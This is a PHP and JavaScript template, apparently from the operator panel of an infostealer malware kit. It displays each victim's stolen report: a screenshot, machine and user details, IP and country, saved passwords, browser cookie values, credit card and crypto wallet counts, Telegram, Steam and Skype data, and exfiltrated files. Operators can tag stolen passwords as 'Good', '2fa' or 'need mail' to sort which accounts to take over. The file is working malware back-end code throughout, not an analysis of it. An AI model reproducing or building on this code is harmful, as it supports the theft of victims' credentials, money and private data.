<?php if(!defined("ACCESS")){exit();} $zip = new ZipArchive; if ($zip->open('./'.REPORTS_FOLDER.'/zip/'.$row['report_file']) === true){ $archive_exist = true; for($i=0; $i<$zip->numFiles; $i++){ if(strpos($zip->getNameIndex($i),"scr.jpg") !== False){ $fh = fopen('./'.REPORTS_FOLDER.'/scr/'.$row['report_file'].'.jpg', 'w'); fwrite($fh, $zip->getFromName('scr.jpg')); } if(strpos($zip->getNameIndex($i),"Telegram/") !== False){ $telegram = true; } if(strpos($zip->getNameIndex($i),"System.txt") !== False){ $system_text = utf8_encode($zip->getFromName('System.txt')); } if(strpos($zip->getNameIndex($i),"Steam/") !== False){ $steam = true; } if(strpos($zip->getNameIndex($i),"Skype/") !== False){ $skype = true; } if(strpos($zip->getNameIndex($i),"Files/") !== False){ $files[] = array(zip2utf($zip->getNameIndex($i)), $zip->statIndex($i)); } if(strpos($zip->getNameIndex($i),"Browsers/Cookies/") !== False){ $cookies_files[] = $zip->getNameIndex($i); } if(strpos($zip->getNameIndex($i),"Coins/") !== False){ $coins[] = $zip->getNameIndex($i); } if(strpos($zip->getNameIndex($i),"Browsers/AutoComplete/") !== False){ $autocomplete_files[] = $zip->getNameIndex($i); } $filenames[] = $zip->getNameIndex($i); } }else{ $archive_exist = false; } ?>
<script>
function CopyToClipboard (containerid) {
  var textarea = document.createElement('textarea');
  textarea.id = 'temp_element';
  textarea.style.height = 0;
  document.body.appendChild(textarea);
  textarea.value = document.getElementById(containerid).innerText;
  var selector = document.querySelector('#temp_element');
  selector.select();
  document.execCommand('copy');
  document.body.removeChild(textarea);
}

function change_tooltip(containerid){
	var a = document.getElementById(containerid);
	a.dataset.tooltip = "Copied!";
	setTimeout(function(){ 
        a.dataset.tooltip = "Click to copy";
    }, 3000);  
}

function viewdiv(id,e){
	var el=document.getElementById(id);
	if(el.style.display != "none"){
		el.style.display = "none";
	} else {
		el.style.display="block";
	}
	return false;
}

$(window).scroll(function() {
  sessionStorage.scrollTop = $(this).scrollTop();
});

$(document).ready(function() {
  if (sessionStorage.scrollTop != "undefined") {
    $(window).scrollTop(sessionStorage.scrollTop);
  }
});

function mark_report(id) {
	var button = document.getElementById("markbutton");
      $.ajax({
        url:"./?p=reports&action=mark&rid=" + id,
        type: "GET",
        success:function(result){
			if(button.className.includes('default')){
				button.className = button.className.replace('default', 'mark');
			}else {
				button.className = button.className.replace('mark', 'default');
			}
			
       }
     });
 }

function pin_report(id) {
	var button = document.getElementById("pinbutton");
      $.ajax({
        url:"./?p=reports&action=pin&rid=" + id,
        type: "GET",
        success:function(result){
			if(button.className.includes('default')){
				button.className = button.className.replace('default', 'pin');
			}else {
				button.className = button.className.replace('pin', 'default');
			}
			
       }
     });
 }

 function delete_password(id) {
	var tr = document.getElementById("tr" + id);
	$.ajax({
        url:"./?p=passwords&action=deletepwd&pid=" + id,
        type: "GET",
        success:function(result){
			tr.style.display = 'none';
       }
     });
 }
 
function change_pwd_status(id){
		var tr = document.getElementById("tr" + id);
		var select = document.getElementById("select" + id);
		var div = document.getElementById("editstatus" + id);
		
		
		var span_start_bad = '<span style=\'font-weight:bold; color:#660000\'>';
		var span_start_good = '<span style=\'font-weight:bold; color:#004d00\'>';
		var span_start_donottouch = '<span style=\'font-weight:bold;\'>';
		var span_end = '</span>';
		
		
		strNewstatus = select.options[select.selectedIndex].value;
	$.ajax({
        url:"./?p=passwords&action=changepwdstatus&pid=" + id,
        type: "POST",
		data: {'passwd_status':strNewstatus},
        success:function(result){
			viewdiv("editstatus" + id);
			viewdiv("showstatus" + id);
			
			if(strNewstatus =='1'){
				//not checked
				document.getElementById("showstatus" + id).innerHTML='not checked';
				tr.className = '';
			}else if(strNewstatus =='2'){
				//not valid + back
				document.getElementById("showstatus" + id).innerHTML= span_start_bad + '[ Bad ]' + span_end;
				tr.className = 'markednotvalidtr';
			}else if(strNewstatus =='3'){
				//valid + back
				document.getElementById("showstatus" + id).innerHTML= span_start_good +'[ Good ]' + span_end;
				tr.className = 'markedvalidtr';
			}else if(strNewstatus =='4'){
				// do not touch + back
				document.getElementById("showstatus" + id).innerHTML= span_start_donottouch + '[ Do not touch! ]' + span_end;
				tr.className = 'markedtr';
			}else if(strNewstatus =='5'){
				// 2fa
				document.getElementById("showstatus" + id).innerHTML= span_start_bad + '[ 2fa ]' + span_end;
				tr.className = '';
			}else if(strNewstatus =='6'){
				//404
				document.getElementById("showstatus" + id).innerHTML= span_start_bad + '[ 404 ]' + span_end;
				tr.className = '';
			}else if(strNewstatus =='7'){
				//need mail
				document.getElementById("showstatus" + id).innerHTML= span_start_bad + '[ need mail ]' + span_end;
				tr.className = '';
			}
       }
     });
}

function change_comment(id){
	newcomm = document.getElementById("newcomm" + id).value;
	$.ajax({
        url:"./?p=reports&action=edit&rid=" + id,
        type: "POST",
		data: {'newcomm':newcomm},
        success:function(result){
			viewdiv("showcomm" + id);
			viewdiv("editcomm" + id);
			document.getElementById("showcomm" + id).innerHTML = newcomm;
       }
     });
}

function delete_report(id) {
	var tr = document.getElementById("tr" + id);
	$.ajax({
        url:"./?p=reports&action=delete&rid=" + id,
        type: "GET",
        success:function(result){
			window.location.href = "<?php echo $_SERVER['SCRIPT_NAME']."?p=".$page; ?>";
       }
     });
 }

</script>
<div>
<!--================================= Base info =================================-->
    <table class="main_table nohover">
        <tr>
            <th>Screen</th>
            <th>Info</th>
        </tr>    
        <tr>
            <td style="width:50%;" valign="top"><?php  if(file_exists("./".REPORTS_FOLDER."/scr/".htmlspecialchars($row['report_file'],ENT_QUOTES).".jpg")){ echo "<img src='./".REPORTS_FOLDER."/scr/".htmlspecialchars($row['report_file'],ENT_QUOTES).".jpg' width='90%' alt='Screenshot' tabindex='0' class='screenshot'>"; }else{ echo "<img src='./img/noscr.jpg' class='screenshot' width='90%' alt='Screenshot'>"; } ?>
			
			</td>
            <td>
            <table class='main_table'>
                <tr><td style='text-align:right;'><b>Report ID:</b></td><td style='text-align:left;'><?php echo (int)$row['id'];?></td></tr>
                <tr><td style='text-align:right;'><b>Computer ID:</b></td><td style='text-align:left;'><?php echo htmlspecialchars($row['comp_id'],ENT_QUOTES);?></td></tr>
                <tr><td style='text-align:right;'><b>Computer Name:</b></td><td style='text-align:left;'><?php echo htmlspecialchars($row['compname'],ENT_QUOTES);?></td></tr>
                <tr><td style='text-align:right;'><b>Username:</b></td><td style='text-align:left;'><?php echo htmlspecialchars($row['username'],ENT_QUOTES);?></td></tr>
                <tr><td style='text-align:right;'><b>IP:</b></td><td style='text-align:left;'><?php echo htmlspecialchars($row['ip'],ENT_QUOTES);?> </td></tr>
                <tr><td style='text-align:right;'><b>Country:</b></td><td style='text-align:left;'>
                <?php  if($row['country']=="-"){$row['country']="N";} echo "<i class='flag flag-24 flag-".strtolower(htmlspecialchars($row['country'], ENT_QUOTES))."' alt='".htmlspecialchars($row['country'], ENT_QUOTES)."' style='border:1px solid black;margin-right:5px;' align='left'></i>".htmlspecialchars($row['country'], ENT_QUOTES)." - ".htmlspecialchars(code_to_country($row['country']), ENT_QUOTES)."</td>";?>
                </td></tr>
                <tr><td style='text-align:right;'><b>Report Time:</b></td><td style='text-align:left;'  class='tooltip tooltip-right' data-tooltip='<?php echo htmlspecialchars(showDate(strtotime($row['time'])),ENT_QUOTES);?>'><?php echo htmlspecialchars($row['time'],ENT_QUOTES);?></td></tr>
                <tr><td style='text-align:right;'><b>OS:</b></td><td style='text-align:left;'><?php echo htmlspecialchars($row['osname'],ENT_QUOTES)." ".htmlspecialchars($row['osarch'],ENT_QUOTES)." ".htmlspecialchars($row['osver'],ENT_QUOTES);?></td></tr>
                <tr><td style='text-align:right;'><b>Rights:</b></td><td style='text-align:left;'><?php  if($row['bin_rights'] =="A"){ echo "Admin"; }else { echo "User"; }?></td></tr>
                <tr><td style='text-align:right;'><b>Loot:</b></td><td style='text-align:left;'><?php
 if(!$row['cc']==0){ echo "<span class='label label-cc tooltip tooltip-left' data-tooltip='Total count of credit cards in report (browser autocomplete): ".(int)$row['cc'].".'>CC: ".(int)$row['cc']."</span> "; } if(!$row['files']==0){ echo "<span class='label label-good tooltip tooltip-left' data-tooltip='Total count of files in report: ".(int)$row['files']."'>files: ".(int)$row['files']."</span> "; } if(!$row['passwords']==0){ echo "<span class='label label-pwd tooltip tooltip-left' data-tooltip='Total count of passwords in report: ".(int)$row['passwords'].".'>pwd: ".(int)$row['passwords']."</span> "; } if(!$row['crypto']==0){ echo "<span class='label label-crypto tooltip tooltip-left' data-tooltip=\"Total count of 'wallet.dat' in report: ".(int)$row['crypto'].".\">crypto: ".(int)$row['crypto']."</span> "; } if($telegram){ echo "<span class='label label-tg'>Telegram</span> "; } if($steam){ echo "<span class='label label-steam'>Steam</span> "; } if($skype){ echo "<span class='label label-skype'>Skype</span> "; } ?></td></tr>
				<!--<tr><td style='text-align:right;'><b>Groups:</b></td>
				<td style='text-align:left;'></td>-->
				</tr>				
                <tr><td style='text-align:right;'><b>Comment:</b></td><td style='text-align:left;'>
				<?php
 echo "<div id='showcomm".$row['id']."' style='display:block;'>"; if(!empty($row['comment'])){ echo htmlspecialchars($row['comment'],ENT_QUOTES); } else{ echo "[ none ]"; } echo "</div>
				<div id='editcomm".$row['id']."' style='display:none;'>
				<input type='text' id='newcomm".$row['id']."' value='".htmlspecialchars($row['comment'],ENT_QUOTES)."'><input type='submit' value='Save' onclick='change_comment(".(int)$row['id'].")'>
				</div>
				"; ?></td></tr>
                <tr><td style='text-align:right;'><b>Actions:</b></td><td nowrap style='text-align:left;'><?php
 if($archive_exist){ echo "<a href=\"./".REPORTS_FOLDER."/zip/".htmlspecialchars($row['report_file'],ENT_QUOTES)."\" class='tooltip tooltip-left' data-tooltip=\"Download report\"><i class=\"button button-download fas fa-download fa-fw\"></i></a> "; } echo "<a href='#' class='tooltip tooltip-left' data-tooltip=\"Mark report\" onclick='mark_report(".(int)$row['id'].")'>"; if($row['marked'] == REPORT_MARKED){ echo "<i class=\"button button-mark fas fa-paint-brush fa-fw\" id='markbutton'></i></a> "; }else{ echo "<i class=\"button button-default fas fa-paint-brush fa-fw\" id='markbutton'></i></a> "; } echo "<a href='#' class='tooltip tooltip-left' data-tooltip=\"Pin report\" onclick='pin_report(".(int)$row['id'].");'>"; if($row['pin'] == REPORT_PINNED){ echo "<i class=\"button button-pin fas fa-thumbtack fa-fw\" id='pinbutton'></i></a> "; }else{ echo "<i class=\"button button-default fas fa-thumbtack fa-fw\" id='pinbutton'></i></a> "; } echo "<a href=\"#\" class='tooltip tooltip-left' data-tooltip=\"Edit comment\" onclick=\"viewdiv('editcomm".(int)$row['id']."');viewdiv('showcomm".(int)$row['id']."');return false;\"><i class=\"button button-default fas fa-edit fa-fw\"></i></a> "; echo "<a href='#' onclick='delete_report(".(int)$row['id'].")' class='tooltip tooltip-left' data-tooltip=\"Delete report\""; echo "><i class=\"button button-delete fas fa-trash-alt fa-fw\"></i></a> "; ?>
                </td></tr>
            </table>
            </td>
        </tr>    
    </table>
<br>
<div style='text-align:center;'><b>[ Popular passwords ]</b> <span onclick="viewdiv('popular_passwords');" style="text-decoration:underline;text-decoration-style:dashed;cursor: pointer;">hide/show</span>
</div>
<div style='display:none' id='popular_passwords'>
<?php  template_show_popular_passwords_table($pwd_result); $pwd_result->data_seek(0);?>
</div>

<div style='text-align:center;'><b>[ Passwords ]</b> <span onclick="viewdiv('passwords');" style="text-decoration:underline;text-decoration-style:dashed;cursor: pointer;">hide/show</span>
</div>
<div style='display:block' id='passwords'>
<?php  template_show_passwords_table($pwd_result, $first+1); ?>
</div>


<!---------------------- Cookies ----------------------------->
<div style='text-align:center;'><b>[ Cookies ]</b> <span onclick="viewdiv('cookies');" style="text-decoration:underline;text-decoration-style:dashed;cursor: pointer;">hide/show</span>
</div>
<div id='cookies' style='display:block;'>
<?php if(!empty($cookies_files)){?>
   <table class="main_table">
        <tr>
            <th>#</th>
            <th>&nbsp;</th>
            <th>Domain</th>
            <th>Name</th>
            <th>Value</th>
            <th>Expiration date</th>
            <!--<th>Actions</th>-->
        </tr>    
        <?php
 $i=1; foreach ($cookies_files as $file){ $cookies_text = $zip->getFromName($file); $cookies = explode("\n",$cookies_text); foreach ($cookies as $cookie){ if(empty($cookie)){continue;} if($i > 50){ break 2; } $tokens = explode("\t", $cookie); $tokens = array_map('trim', $tokens); if($tokens[4] < time()){ echo "<tr style='background-color:#ffb1b1;'>"; } else{ echo "<tr>"; } echo "<td style='text-align:left;'>".(int)$i."</td>";$i++; $browser = str_replace(array(".txt", "Browsers/Cookies/","INetCache", "Low", ".default", "_Opera Stable"), "", $file); $browser = preg_replace("#_[0-9a-z]{8}#","",$browser); $browser = preg_replace("#_(.*?)$#","",$browser); $browser = preg_replace("#-(.*?)$#","",$browser); echo "<td style='text-align:left;'><img src='./img/softs/".htmlspecialchars($browser,ENT_QUOTES).".png'></td>"; echo "<td style='text-align:left;'>".htmlspecialchars(substr($tokens[0], 0, 35),ENT_QUOTES)."</td>"; if(strlen($tokens[5]) > 20){ $cookie_name = substr($tokens[5],0,20)."..."; } else{ $cookie_name = substr($tokens[5],0,20); } echo "<td style='text-align:left;'>".htmlspecialchars($cookie_name,ENT_QUOTES)."</td>"; echo "<td style='text-align:left;'><input type='text' style='Border: none; outline: none;' value='".htmlspecialchars($tokens[6],ENT_QUOTES)."' size='30'></td>"; echo "<td style='text-align:left;'>".htmlspecialchars(date('Y-m-d h:i:s', $tokens[4]),ENT_QUOTES)."</td>"; echo "</tr>"; } } } else{ echo " <table class=\"main_table\"><thead><tr>
            <td colspan=\"7\"><span class='tbl_title'>[ Cookies ]</span></td>
        </tr><tbody><tr><td colspan=7>[ none ]</td></tr></tbody></table>"; } ?>
    </table>
</div>
<!---------------------- Files ----------------------------->
<div style='text-align:center;'><b>[ Files ]</b> <span onclick="viewdiv('files');" style="text-decoration:underline;text-decoration-style:dashed;cursor: pointer;">hide/show</span>
</div>
<div id='files' style='display:block;'>
<table class="filetable main_table">
  <tbody>
    <tr>
        <th>#</th>
        <th>File</th>
        <th>Size</th>
        <th>Date</th>
    </tr>
        <?php
 $i = 1; $totalsize = 0; if(!empty($files)){ foreach($files as $file){ echo "<tr>\n"; echo "<td>".(int)$i."</td>\n"; echo "<td style='text-align:left;'>".htmlspecialchars(substr(trim($file[0]),6),ENT_QUOTES)."</td>\n"; echo "<td style='text-align:left;'>".htmlspecialchars(human_filesize(trim($file[1]['size']),0),ENT_QUOTES)."</td>\n"; $totalsize += htmlspecialchars($file[1]['size'],ENT_QUOTES); echo "<td style='text-align:left;' nowrap>".htmlspecialchars(date("Y-m-d H:i:s", trim($file[1]['mtime'])),ENT_QUOTES)."</td>\n"; echo "</tr>\n"; $i++; } } ?>
    <tfoot>
    <tr>
       <?php
 echo "<td>&nbsp</td>\n"; echo "<td style='text-align:left;'><b>Number of files:</b> ".(int)$i." <b>Total size:</b> ".htmlspecialchars(human_filesize($totalsize, 0),ENT_QUOTES)."</td>\n"; echo "<td colspan='2'>&nbsp</td>\n"; ?>
    </tr>
</table>
</div>

<!--====================== Autocomplete ======================-->
<!--<br>    
<table class="main_table">
        <thead>
        <tr>
            <td colspan="3"><span class='tbl_title'>[ Autocomplete ]</span></td>
        </tr>
        </thead>
        <tr>
            <th>#</th>
            <th>Parameter</th>
            <th>Value</th>

        </tr>    
        <?php
 ?>
</table>
-->
<!----------- Installed software and updates ---------------->
<div style='text-align:center;'><b>[ Installed software and updates ]</b> <span onclick="viewdiv('software');" style="text-decoration:underline;text-decoration-style:dashed;cursor: pointer;">hide/show</span>
</div>
<div id='software' style='display:block'>
<?php
 if(!empty($system_text)){ $pos = strrpos($system_text, "[Soft]"); $hidden = 0; $soft_arr = explode("\r\n",substr($system_text, $pos)); $soft_arr = array_unique($soft_arr); sort($soft_arr); }else { $soft_arr = array(); } ?>
    <table class="main_table">
        <tr>
            <th>#</th>
            <th>Softname</th>
        </tr>
        <?php
 $i=1; foreach($soft_arr as $soft){ if(trim($soft) == "[Soft]" or empty(trim($soft))){ continue; } if(strpos(trim($soft),"Microsoft Visual C++") !== false){ $hidden ++; continue; } echo "<tr>"; echo "<td>".$i."</td>";$i++; echo "<td style='text-align:left;'>".htmlspecialchars(trim($soft),ENT_QUOTES)."</td>"; echo "</tr>"; } ?>
        <tfoot>
        <tr>
        <?php
 echo "<td>&nbsp</td>\n"; echo "<td style='text-align:left;'><b>Скрыто записей: </b> ".(int)$hidden."</td>\n"; ?>
        </tr>
    </tfoot>
    </table>
</div>
<br><br>
</div>